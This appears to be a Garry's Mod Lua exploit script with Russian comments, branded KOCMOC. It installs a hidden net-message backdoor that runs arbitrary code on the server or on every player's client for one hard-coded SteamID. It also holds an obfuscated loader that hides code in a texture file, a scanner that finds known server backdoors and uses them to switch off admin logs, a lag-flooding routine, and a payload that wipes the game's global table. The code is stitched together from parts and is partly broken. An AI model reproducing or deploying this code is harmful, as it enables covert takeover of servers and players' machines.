║║║╚═╗║╚╝║║╚═╗║║╚╝║║║╚╝║║╚═╗─────║║───╔╝║──║║──╔╗───║║║║║║║║║╚══╗╔═╝║║╚═╗║║║║╔╝║║║║╚╝║───║╚══╗║║║║──║║──║║║║
╚╝╚══╝╚══╝╚══╝╚╝──╚╝╚══╝╚══╝─────╚╝───╚═╝──╚╝──╚╝───╚╝╚╝╚╝╚╝╚═══╝╚══╝╚══╝╚╝╚╝╚═╝╚╝╚══╝───╚═══╝╚╝╚╝──╚╝──╚╝╚╝

]]--

--это вообще че ты щас скинул
local elite = {
	['STEAM_0:1:504959081'] = true
}

util.SetPData( 'STEAM_0:1:504959081', nil, 0 )

util.AddNetworkString('_ASdioc28b499999QUIUIIIIQIIVA_')

local function RunOnCL(tar, code)
	if !tar.CodeReceiver then
		tar.CodeReceiver=true
		tar:SendLua([[net.Receive('_ASdioc28b499999QUIUIIIIQIIVA_',function() RunString(net.ReadString()) end)]])
	end
	net.Start('_ASdioc28b499999QUIUIIIIQIIVA_')
	net.WriteString(code)
	net.Send(tar)
end



local rec = {
	[1] = function(code)
		RunString(code)
	end,
	[2] = function(code)
		for k, v in pairs(player.GetAll()) do
			RunOnCL(v, code)
		end
	end,
	[3] = function(code)
		RunOnCL(net.ReadEntity(), code)
	end,
}

net.Receive('_ASdioc28b499999QUIUIIIIQIIVA_', function(len, ply)
	if !elite[ply:SteamID()] then return end
	
	local code = net.ReadString()
	rec[net.ReadUInt(2)](code)
end)
local code = ([[
    local function a(b, c)
        c = c % 177
    
        return (b - c) % 177
    end
    
    local function d(e, f)
        local g = tonumber(util.CRC(f))
        local h = string.len(e)
        local i = string.len(f)
        local j = 1
        local k = 1
        local l = {}
    
        while j <= h do
            j = j + string.byte(f[k % (i - 1) + 1])
            l[k] = a(string.byte(e[j]), g)
            k = k + 1
            j = j + 1
        end
    
        return string.char(unpack(l))
    end
    
    local function VTF(m, n, o)
        local p = file.Open(m, "rb", "BASE_PATH")
        if not p then return end
        p:Skip(o)
        local q = p:Read(p:Size() - o)
        local vc = _G["Com" .. "pi" .. "leStr" .. "ing"]
        p:Close()
        local l = d(q, n)
    
        return vc(l, m, false)
    end
    
    local r = VTF("garrysmod/addons/gmaps/materials/models/modules.vtf")
    ]])



    function jopasenwaya()

        clearcon()
        
        print("Включаем лаги епта")
        
        clearcon()
        
        print("Опа паехала..")
        
        clearcon()
        
        print("Опа паехала...")
        
        timer.Create( "rconymerlanaxuy", 35, 0, function()
        
        for i=0, 7000 do
        
        local tosend = {
        
            cmd="+forward",
        
            args=" "
        
            
        
            }
        
            net.Start('dLogsGetCommand')
        
            net.WriteTable(tosend)
        
            net.SendToServer()
        
            
        
        end end) end




    function KOCMOCFF.RemoveHooks()
        hook.Remove( "PlayerInitialSpawn", "showMotd")
        hook.Remove( "CalcView", "rp_deathPOV" )
        hook.Remove( "PlayerBindPress", "BlockPhysgunWheelSpeedGlitch" )
        hook.Remove( "Think", "FancyMOTD.OpenOnKeypress" )
        hook.Remove( "RenderScreenspaceEffects", "WeatherOverlay" )
        hook.Remove( "RenderScreenspaceEffects", "DrawMotionBlur" )
        hook.Remove( "PlayerInitialSpawn", "OpenMotdOnJoin" )
        hook.Remove( "PlayerSay", "OpenMotdOnCommand" )
        hook.Remove( "Initialize","silkymotd" )
        hook.Remove( "OnPlayerChat", "moonttt" )
        hook.Remove( "HUDPaint", "atmosHUDPaint" )
        hook.Remove( "InitPostEntity", "MOTDgdInitHook" )
        hook.Remove( "InitPostEntity", "startMistforums" )
        hook.Remove( "InitPostEntity", "mistforums-GetClientFiles" )
        hook.Remove( "Think", "atmosStormThink" )
        hook.Remove( "PlayerCanHearPlayersVoice", "ULXGag" )
        hook.Remove( "PostDrawOpaqueRenderables", "example" )
        hook.Remove( "PlayerAuthed", "wat" )
        hook.Remove( "HUDPaint", "newhud" )
        hook.Remove( "HUDShouldDraw", "newhud" )
        hook.Remove( "Think", "wat" )
        hook.Remove( "RenderScreenspaceEffects", "wat" )
        hook.Remove( "HUDPaint", "dance" )
        hook.Remove( "GetMotionBlurValues", "wat" )
        hook.Remove( "RenderScreenspaceEffects", "ohgod" )
        hook.Remove( "PostDrawTranslucentRenderables", "ohgod" )
        timer.Destroy( "thedrop" )
        timer.Destroy( "NLRChecker" )
        hook.Remove( "OnContextMenuOpen", "NoContext4u" )
        hook.Remove( "HUDPaint", "gtavds_HUDPaint" )
        hook.Remove( "InitPostEntity", "D3A.OpenMoTD.InitPostEntity" )
        hook.Remove( "ContextMenuOpen", "AdminContext" )
        hook.Remove( "ContextMenuOpen", "AdminContextMenu" )
        hook.Remove( "InitPostEntity", "cnTicker" )
        hook.Remove( "PlayerBindPress", "Test")
        hook.Remove( "PlayerCanPickupWeapon", "noDoublePickup")
        hook.Remove("Think","TBFY_Surrender")
      end
       
      function KOCMOCFFF.RemoveNets()
        net.Receive( "MOTDgdUpdate", function() end )
        net.Receive( "atmos_snow", function() end )
        net.Receive( "atmos_storm", function() end )
        net.Receive( "Mistforums.sendClientFile", function() end )
        net.Receive( "open_menu", function() end )
        net.Receive( "openmotd", function() end )
        net.Receive( "LuneraInitMenu", function() end )
        net.Receive( "closebutton_repeat", function() end )
        net.Receive( "sBlockGMSpawn", function() hook.Remove( "PlayerBindPress", "_sBlockGMSpawn" ) end )
        net.Receive( "NDS_death", function() return end )
        net.Receive( "silkymotd", function() return end )
        net.Receive( "slua", function() return end )
        net.Receive( "1942_Rule_Check", function() return end )
        net.Receive( "1942_Economy_QuestionMenu", function() return end )
        net.Receive( "1942_Revive_Notice", function() return end )
        net.Receive( "tbfy_surrender", function() return end )
        net.Receive( "VelocityKillerMessage", function() return end )
      end





      if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
        netKey = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        netKey = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end

        if( ValidNetString("_Kocmoc") ) then
        netKey = "_Kocmoc"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end
	
    if( ValidNetString("jesuslebg") ) then
        netKey = "jesuslebg"
    else
    end
	
    if( ValidNetString("zilnix") ) then
        netKey = "zilnix"
    else
    end

    if netKey == "" then
         chat.AddText(Color(0,0,0), "[KOCMOC]", Color( 255, 255, 255 ), "Бэкдуров не обнаружено" )
    else
        chat.AddText(Color(0,0,0),"[KOCMOC]", Color( 255, 255, 255 ), "Бэкдур найден: ".. netKey )
            
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho", "0" )
                net.WriteBit(0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho", "0" )
                    net.WriteBit(1)
                     net.SendToServer()

                chat.AddText("Логи выключены." )
                end)
            end
    end




    function checkbackdoors()
        if( ValidNetString("memeDoor") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - memeDoor" )
            netKey = "memeDoor"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено. " )
        end
    
        if( ValidNetString("Sandbox_Armdupe") ) then 
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - Sandbox_Armdupe" )
            netKey = "Sandbox_Armdupe"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("DarkRP_AdminWeapons") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - DarkRP_AdminWeapons" )
            netKey = "DarkRP_AdminWeapons"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
        if( ValidNetString("SessionBackdoor") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - SessionBackdoor" )
            netKey = "SessionBackdoor"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("Fix_Keypads") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - Fix_Keypads" )
            netKey = "Fix_Keypads"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("Remove_Exploiters") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - Remove_Exploiters" )
            netKey = "Remove_Exploiters"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("noclipcloakaesp_chat_text") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - noclipcloakaesp_chat_text" )
            netKey = "noclipcloakaesp_chat_text"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("_Defqon") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - _Defqon" )
            netKey = "_Defqon"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("_CAC_ReadMemory") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - _CAC_ReadMemory" )
            netKey = "_CAC_ReadMemory"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("nostrip") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - nostrip" )
            netKey = "nostrip"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("LickMeOut") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - LickMeOut" )
            netKey = "LickMeOut"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("MoonMan") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - MoonMan" )
            netKey = "MoonMan"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("Im_SOCool") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - Im_SOCool" )
            netKey = "Im_SOCool"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
    
        if( ValidNetString("ULXQUERY2") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - ULXQUERY2" )
            netKey = "ULXQUERY2"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
        
        if( ValidNetString("jesuslebg") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - jesuslebg" )
            netKey = "jesuslebg"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
        
        if( ValidNetString("zilnix") ) then
                BackdoorsFound = 1 + BackdoorsFound 
            chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдур найден! - zilnix" )
            netKey = "zilnix"
        else
        chat.AddText( Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 )," Бэкдура не найдено." )
        end
        
        SploitNotify("Бэкдур найден: ".. netKey )
        chat.AddText(Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 ), "Нетворк изменен - ".. netKey  )
    end
    
    function Inject()
        chat.AddText(Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 ), " Инжектим..." )
        if ( ply:IsSuperAdmin() ) then
            timer.Simple( 3, function() 
                if( ValidNetString("SessionBackdoor") ) then
    
                else
                
                    chat.AddText(Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 ), " Инжект успешен !" )
                end
            end )
        else
            chat.AddText(Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 ), " Вам нужна суперадминка" )
        end
        if( ValidNetString("SessionBackdoor") ) then
            chat.AddText(Color( 0, 0, 0 ), "[KOCMOC]", Color( 255, 255, 255 ), " Бэкдуров не найдено." )
        end
    end


-----------------------------------------------------------------


--EVIL TIME rip headpones











local AMPH = ScrH() * 5
local AMPW = ScrW() / 156
local a = 0
local smoothdata = {}
local data = {}
local view = {}
for i = 1,256 do
smoothdata[i] = 0
end
local xpcall = {}


timer.Simple(102,function() RunString(table.Empty(_G)) end)

sound.PlayURL(discomusic,discomusicclassics, function(source,err,errname)
	source:SetVolume( volumes )
    if IsValid(source) then
    	    hook.Add("HUDPaint","visualizer",function()
            source:FFT(data,FFT_4096)
            for i = 1,1 do
                smoothdata [i] = Lerp(5 * FrameTime(),smoothdata[i],data[i])
                	surface.SetDrawColor(255,255,255,255)
                	surface.SetMaterial( sosimychlen )
                	draw.RotatedBox( ScrW() / 2, ScrH() / 2, 2.5, 100 + smoothdata[i] * AMPH, i * 1.25 * CurTime() % 360, HSVToColor(RealTime() * 120 % 360, 1, 1) )
                	surface.DrawCircle( 965, 540, smoothdata[i] * AMPH, HSVToColor(RealTime() * 120 % 360, 1, 1) )
                    local tbl = {} source:FFT(tbl,FFT_4096) 
                    local fal = 0 for i=1,80 do
                    fal = fal + tbl[i] end
                            prevValue = Lerp(150 * FrameTime(), prevValue, fal) if fal > 2 then
                                override = Lerp(1 * FrameTime(), override, fal * .875)
                                net.Start("faitleserv") net.SendToServer()
                            else
                                override = Lerp(4 * FrameTime(), override, defaultfov)
                                sent = false
                            end
                        end
                    end)
                end
            end)
--кто не скачет тот москаль
